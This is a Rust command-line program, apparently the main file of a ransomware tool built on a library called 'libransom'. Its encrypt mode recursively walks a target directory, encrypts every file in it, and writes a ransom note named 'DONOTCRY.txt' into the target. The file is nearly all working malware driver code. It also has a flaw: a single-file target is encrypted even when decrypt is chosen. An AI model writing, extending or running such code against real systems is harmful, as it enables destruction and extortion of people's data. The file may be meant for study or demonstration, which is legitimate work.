use clap::{arg, command, Command};
use std::fs;
use walkdir::WalkDir;

pub use libransom::{decrypt, encrypt};

fn main() {
    let matches = command!()
        .subcommand(
            Command::new("encrypt")
                .about("Encrypt a target: file or directory")
                .arg(arg!(<target> "Target directory or file to encrypt")),
        )
        .subcommand(
            Command::new("decrypt")
                .about("Decrypt a target: file or directory")
                .arg(arg!(<target> "Target directory or file to decrypt")),
        )
        .get_matches();

    let mut filename: &str = "default";
    let mut action: &str = "default";
    let mut encrypt_or_decrypt = false;

    if let Some(matches) = matches.subcommand_matches("encrypt") {
        filename = matches
            .get_raw("target")
            .expect("target is required")
            .next()
            .unwrap()
            .to_str()
            .unwrap();

        // Create DONOTCRY.txt file
        let readme_msg = include_str!("../res/DONOTCRY.txt");
        let readme_path = if fs::metadata(filename).unwrap().is_file() {
            String::from("DONOTCRY.txt")
        } else {
            format!("{}/DONOTCRY.txt", filename)
        };

        fs::write(readme_path, readme_msg).unwrap();

        action = "encrypt";
        encrypt_or_decrypt = true;
    }

    if let Some(matches) = matches.subcommand_matches("decrypt") {
        filename = matches
            .get_raw("target")
            .expect("target is required")
            .next()
            .unwrap()
            .to_str()
            .unwrap();
        action = "decrypt";
        encrypt_or_decrypt = true;
    }

    if encrypt_or_decrypt {
        // Check if the input is a file or a directory
        if fs::metadata(filename).unwrap().is_dir() {
            // Iterate over files and directories inside a directory and encrypt or decrypt them
            for entry in WalkDir::new(filename).into_iter().filter_map(|e| e.ok()) {
                if entry.file_type().is_file() {
                    if action == "encrypt" {
                        encrypt(entry.path().to_str().unwrap());
                    } else if action == "decrypt" {
                        decrypt(entry.path().to_str().unwrap());
                    }
                }
            }
        } else {
            encrypt(filename);
        }
    }
}
